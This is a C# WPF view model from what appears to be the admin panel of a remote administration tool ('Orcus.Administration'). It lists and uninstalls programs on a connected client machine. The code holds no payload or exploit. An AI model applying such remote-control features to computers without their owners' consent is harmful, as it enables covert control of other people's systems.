using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Windows;
using System.Windows.Data;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.UninstallPrograms;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    public class UninstallProgramsViewModel : CommandView
    {
        private ICollectionView _collectionView;
        private RelayCommand _openPathInFileExplorerCommand;
        private RelayCommand _refreshProgramsCommand;
        private List<AdvancedUninstallableProgram> _uninstallablePrograms;
        private RelayCommand _uninstallProgramCommand;

        public override string Name { get; } = (string) Application.Current.Resources["Programs"];
        public override Category Category { get; } = Category.System;
        public UninstallProgramsCommand UninstallProgramsCommand { get; private set; }

        public ICollectionView CollectionView
        {
            get { return _collectionView; }
            set { SetProperty(value, ref _collectionView); }
        }

        public RelayCommand RefreshProgramsCommand
        {
            get
            {
                return _refreshProgramsCommand ??
                       (_refreshProgramsCommand =
                           new RelayCommand(parameter => { UninstallProgramsCommand.GetInstalledPrograms(); }));
            }
        }

        public RelayCommand UninstallProgramCommand
        {
            get
            {
                return _uninstallProgramCommand ?? (_uninstallProgramCommand = new RelayCommand(parameter =>
                {
                    var program = parameter as AdvancedUninstallableProgram;
                    if (program != null)
                        UninstallProgramsCommand.UninstallProgram(program);
                }));
            }
        }

        public RelayCommand OpenPathInFileExplorerCommand
        {
            get
            {
                return _openPathInFileExplorerCommand ?? (_openPathInFileExplorerCommand = new RelayCommand(parameter =>
                {
                    var program = parameter as AdvancedUninstallableProgram;
                    if (string.IsNullOrEmpty(program?.Location))
                        return;

                    CrossViewManager.OpenPathInFileExplorer(program.Location);
                }));
            }
        }

        public override void Dispose()
        {
            base.Dispose();

            if (_uninstallablePrograms != null)
                foreach (var program in _uninstallablePrograms)
                    program.Dispose();
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
            UninstallProgramsCommand = clientController.Commander.GetCommand<UninstallProgramsCommand>();
            UninstallProgramsCommand.RefreshList += UninstallProgramsCommand_RefreshList;
        }

        public override void LoadView(bool loadData)
        {
            RefreshProgramsCommand.Execute(null);
        }

        protected override ImageSource GetIconImageSource()
        {
            return new BitmapImage(new Uri("pack://application:,,,/Resources/Images/VisualStudio/Uninstall_16x.png", UriKind.Absolute));
        }

        private async void UninstallProgramsCommand_RefreshList(object sender, List<AdvancedUninstallableProgram> e)
        {
            await Application.Current.Dispatcher.BeginInvoke(new Action(() =>
            {
                _uninstallablePrograms = e;
                CollectionView = CollectionViewSource.GetDefaultView(e);
                CollectionView.SortDescriptions.Add(new SortDescription("Name", ListSortDirection.Ascending));
            }));
        }
    }
}